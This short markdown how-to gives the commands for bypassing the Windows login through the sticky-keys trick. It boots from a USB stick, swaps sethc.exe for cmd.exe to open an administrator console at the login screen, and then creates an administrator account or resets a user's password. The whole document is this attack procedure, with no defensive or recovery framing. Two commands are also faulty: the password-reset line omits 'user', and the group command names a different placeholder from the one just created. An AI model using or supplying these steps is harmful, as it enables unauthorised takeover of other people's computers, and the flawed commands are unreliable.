# Windows Login without Password

* Boot from USB-Stick:
* change `sethc.exe` to `cmd.exe`:

```bash
cd /media/sda2/Windows/System32
mv  sethc.exe sethc.bak
cp cmd.exe sethc.exe
```

* Boot into Windows
* press <kbd>Shift</kbd> 5 times to open admin console
* Create new user:

```cmd
net user %user% %password% /add
net localgroup Administrators %NewAdmin% /add
```

* or change password of existing user:

```cmd
net %user% %new_password%
```

* Log in
* Rename `sethc.bak` to `sethc.exe`:

```cmd
move /y c:\windows\system32\sethc.bak c:\windows\system32\sethc.exe
```

